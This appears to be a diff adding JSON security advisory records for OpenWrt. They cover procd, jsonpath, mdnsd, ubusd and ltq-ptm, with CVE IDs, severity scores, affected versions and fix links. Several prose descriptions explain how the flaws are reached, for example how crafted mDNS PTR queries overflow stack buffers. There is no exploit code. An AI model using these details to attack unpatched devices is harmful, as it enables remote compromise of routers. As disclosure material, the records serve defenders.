+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "score": 6.5
+   },
+   "cvss_v4": {
+    "vector_string": null,
+    "score": null
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "openwrt",
+     "name": "openwrt"
+    },
+    "vulnerable_version_range": "≤ commit 8e724fc",
+    "patched_versions": "",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-06-29T22:56:21Z",
+  "updated_at": "2026-06-29T22:56:21Z",
+  "severity": "medium"
+ },
+ {
+  "ghsa_id": "GHSA-jw28-hxcm-j934",
+  "cve_id": "CVE-2026-30874",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-jw28-hxcm-j934",
+  "summary": "procd: Command execution via PATH environment variable filter bypass",
+  "description": "procd executes scripts located in /etc/hotplug.d when certain events happen on a\r\nsystem, and can be invoked via the call ubus method. The hotplug_call function is\r\nresponsible for handling these invocations and will perform environment variable filtering\r\nand processing during execution. One of the environment variables that is filtered out is\r\nthe PATH variable, but because of the use of strcmp rather than strncmp, the variable is\r\nnot excluded. Instead of comparing the first four characters of the environment variable to\r\nPATH, the full string is compared, and the variable is therefore not skipped. As such, it may\r\nbe possible to specify an arbitrary PATH variable in order to perform privilege escalation.\r\n\r\n### References\r\nFix: http://github.com/openwrt/procd/commit/e08cdc8562f55b9ac228a21f3f7605a18c522b81",
+  "cvss": {
+   "vector_string": null,
+   "score": null
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": null,
+    "score": null
+   },
+   "cvss_v4": {
+    "vector_string": "CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+    "score": 1.8
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.6",
+    "patched_versions": "24.10.6",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-03-19T16:29:14Z",
+  "updated_at": "2026-03-19T16:36:55Z",
+  "severity": "low"
+ },
+ {
+  "ghsa_id": "GHSA-rcc6-v4r6-gj4m",
+  "cve_id": "CVE-2026-30873",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-rcc6-v4r6-gj4m",
+  "summary": "jsonpath: Memory leak when processing strings, labels, and regexp tokens",
+  "description": "The jp_get_token function is part of the lexical analysis phase, which breaks input\r\nexpressions into individual tokens for subsequent parsing. During tokenization, the library\r\nextracts and stores string literals, field labels, and regular expressions, which involves\r\ndynamic memory allocation to handle variable-length text content. The extraction results\r\nare stored in the jp_opcode struct, which is later transferred to a new jp_opcode object\r\nin the jp_alloc_op function. If a string was previously extracted to an initial jp_opcode\r\nobject, the string will be copied to the new allocation, without freeing the previous one,\r\nleading to a memory leak.",
+  "cvss": {
+   "vector_string": null,
+   "score": null
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": null,
+    "score": null
+   },
+   "cvss_v4": {
+    "vector_string": "CVSS:4.0/AV:A/AC:L/AT:N/PR:H/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+    "score": 2.4
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.6",
+    "patched_versions": "24.10.6",
+    "vulnerable_functions": []
+   },
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 25.12.1",
+    "patched_versions": "25.12.1",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-03-19T16:29:19Z",
+  "updated_at": "2026-03-19T17:29:32Z",
+  "severity": "low"
+ },
+ {
+  "ghsa_id": "GHSA-mpgh-v658-jqv5",
+  "cve_id": "CVE-2026-30872",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-mpgh-v658-jqv5",
+  "summary": "mdnsd: Stack buffer overflow in IPv6 reverse DNS lookup",
+  "description": "The mdns daemon contains a stack buffer overflow vulnerability in the\r\nmatch_ipv6_addresses function when processing PTR queries for IPv6 reverse DNS\r\ndomains (.ip6.arpa). The vulnerability is reachable through normal DNS packet\r\nprocessing when the daemon receives multicast DNS queries on UDP port 5353.\r\nThe global buffer name_buffer, which holds the expanded domain after the call to\r\ndns_consume_name, is processed in the parse_question function, where different DNS\r\nquery types are handled. For TYPE_PTR queries, dns_consume_name checks if\r\nname_buffer ends with a reverse DNS suffix. If a match is found, the strcpy operation is\r\nperformed from name_buffer into a fixed 256-byte stack buffer with the IPv6 reverse DNS\r\nsuffix being excluded. The resultant buffer is then processed by\r\ndns_reply_reverse_ip6_mapping, which calls match_ipv6_addresses.\r\nIn the match_ipv6_addresses function, the reverse IPv6 request is extracted into a\r\nbuffer of length INET6_ADDRSTRLEN (46). Since the length of the data in the 256-byte\r\nbuffer is not checked before extracting the IPv6 address, it is possible for the data to be\r\nlarger than 46 bytes, leading to an out-of-bounds (OOB) write",
+  "cvss": {
+   "vector_string": null,
+   "score": null
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": null,
+    "score": null
+   },
+   "cvss_v4": {
+    "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+    "score": 9.5
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.6",
+    "patched_versions": "24.10.6",
+    "vulnerable_functions": []
+   },
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 25.12.1",
+    "patched_versions": "25.12.1",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-03-19T16:29:27Z",
+  "updated_at": "2026-03-19T17:29:49Z",
+  "severity": "critical"
+ },
+ {
+  "ghsa_id": "GHSA-7c3j-f7w2-p8f6",
+  "cve_id": "CVE-2026-30871",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-7c3j-f7w2-p8f6",
+  "summary": "mdnsd: Stack buffer overflow in DNS PTR query",
+  "description": "The mdns daemon contains a stack buffer overflow vulnerability in the parse_question\r\nfunction when processing PTR queries for reverse DNS domains (.in-addr.arpa and\r\n.ip6.arpa). The vulnerability is reachable through normal DNS packet processing when\r\nthe daemon receives multicast DNS queries on UDP port 5353.\r\nDNS packets are first processed by dns_handle_packet, which validates and processes\r\nthe packets in dns_consume_name. This function calls dn_expand to expand the queried\r\ndomain into the fixed-sized global buffer, name_buffer, which holds 8096 bytes\r\n(MAX_NAME_LEN).\r\nThe same global buffer is then processed in the parse_question function, where\r\ndifferent types of DNS queries are handled. For TYPE_PTR queries, the function checks if\r\nname_buffer ends with a reverse DNS suffix. When a match is found, it performs an\r\nunbounded strcpy from the potentially large expanded name in name_buffer into fixed\r\n256-byte stack buffers.\r\nThe issue is that when dn_expand encounters non-printable ASCII bytes (0x01, 0x02, …), it\r\nwill convert the bytes to their octal representations. For example, the byte 0x01 would be\r\nconverted to its octal counterpart, \\001, which is 0x5C 0x30 0x30 0x31.\r\nAs such, it is possible to forge a maliciously crafted DNS packet such that when it is\r\nexpanded, it is much greater than the intended 256-byte stack buffer.",
+  "cvss": {
+   "vector_string": null,
+   "score": null
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": null,
+    "score": null
+   },
+   "cvss_v4": {
+    "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+    "score": 9.5
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.6",
+    "patched_versions": "24.10.6",
+    "vulnerable_functions": []
+   },
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 25.12.1",
+    "patched_versions": "25.12.1",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2026-03-19T16:29:33Z",
+  "updated_at": "2026-03-19T17:30:08Z",
+  "severity": "critical"
+ },
+ {
+  "ghsa_id": "GHSA-cp32-65v4-cp73",
+  "cve_id": "CVE-2025-62526",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-cp32-65v4-cp73",
+  "summary": "ubusd: heap buffer overflow",
+  "description": "### Impact\r\nubusd contains a heap buffer overflow in the event registration parsing code. This allows an attacker to modify the head and potentially execute arbitrary code in the context of the ubus daemon.\r\nThe affected code is executed before running the ACL checks, all ubus clients are able to send such messages.\r\nIn addition to the heap corruption, the crafted subscription also results in a bypass of the listen ACL.\r\n\r\n### Patches\r\nThis is fixed in OpenWrt 24.10.4 and later, including snapshots builds since October 18th 2025.\r\nOlder OpenWrt versions like 23.05 and 22.03 might be affected too, but they are end of life and do not receive any security support any more. \r\n\r\n### Workarounds\r\nNo\r\n\r\n### References\r\nubus fix: https://github.com/openwrt/ubus/commit/d31effb4277bd557f5ccf16d909422718c1e49d0\r\nfix similar code pattern: https://github.com/openwrt/ubus/commit/aa4a7ee1d3417bc11207ad0a78d579ece7fe0c13\r\nfix ACL bypass: https://github.com/openwrt/ubus/commit/60e04048a0e2f3e33651c19e62861b41be4c290f\r\n\r\nOpenWrt main branch: https://github.com/openwrt/openwrt/commit/4b907e69ea58fc0ba35fd1755dc4ba22262af3a4\r\nOpenWrt 24.10: https://github.com/openwrt/openwrt/commit/a7901969932a175cded3c93bdeb65f32ed3705e6\r\n\r\nOpenWrt security advisory: https://openwrt.org/advisory/2025-10-22-1\r\n\r\n### Credit\r\nThank you Karsten Sperling from Apple for the report and the PoC.",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H",
+   "score": 7.9
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H",
+    "score": 7.9
+   },
+   "cvss_v4": {
+    "vector_string": null,
+    "score": null
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.4",
+    "patched_versions": "24.10.4",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2025-10-21T22:40:17Z",
+  "updated_at": "2025-10-22T09:34:32Z",
+  "severity": "high"
+ },
+ {
+  "ghsa_id": "GHSA-h427-frpr-7cqr",
+  "cve_id": "CVE-2025-62525",
+  "html_url": "https://github.com/openwrt/openwrt/security/advisories/GHSA-h427-frpr-7cqr",
+  "summary": "ltq-ptm: local privilege escalation",
+  "description": "### Impact\r\nLocal users could read and write arbitrary kernel memory using the ioctls of the ltq-ptm driver which is used to drive the datapath of the DSL line.\r\nThis only effects the lantiq target supporting xrx200, danube and amazon SoCs from Lantiq/Intel/MaxLinear with the DSL in PTM mode. The DSL driver for the VRX518 is not affected. ATM mode is also not affected. Most VDSL lines use PTM mode and most ADSL lines use ATM mode.\r\n\r\nOpenWrt is normally running as a single user system, but some services are sandboxed. This vulnerability could allow attackers to escape a ujail sandbox or other contains.\r\n\r\n### Patches\r\nThis is fixed in OpenWrt 24.10.4 and later, including snapshots builds since October 15th 2025.\r\nOlder OpenWrt versions like 23.05 and 22.03 might be affected too, but they are end of life and do not receive any security support any more. \r\n\r\n\r\n### Workarounds\r\nNo\r\n\r\n### References\r\nFix main branch: https://github.com/openwrt/openwrt/commit/2a76abc5442e3f74d95b4caa9bb57e5488fc132e\r\nFix OpenWrt 24.10: https://github.com/openwrt/openwrt/commit/e001b31163a77683ee741d169f794cfa50926f37\r\n\r\nOpenWrt security advisory: https://openwrt.org/advisory/2025-10-22-2\r\n\r\n### Credit\r\nThank you Stanislav Fort from Aisle Research for reporting this to us.",
+  "cvss": {
+   "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H",
+   "score": 7.9
+  },
+  "cvss_severities": {
+   "cvss_v3": {
+    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H",
+    "score": 7.9
+   },
+   "cvss_v4": {
+    "vector_string": null,
+    "score": null
+   }
+  },
+  "vulnerabilities": [
+   {
+    "package": {
+     "ecosystem": "",
+     "name": "OpenWrt"
+    },
+    "vulnerable_version_range": "< 24.10.4",
+    "patched_versions": "24.10.4",
+    "vulnerable_functions": []
+   }
+  ],
+  "published_at": "2025-10-21T22:40:22Z",
+  "updated_at": "2025-10-22T09:34:35Z",
+  "severity": "high"
+ }
+]
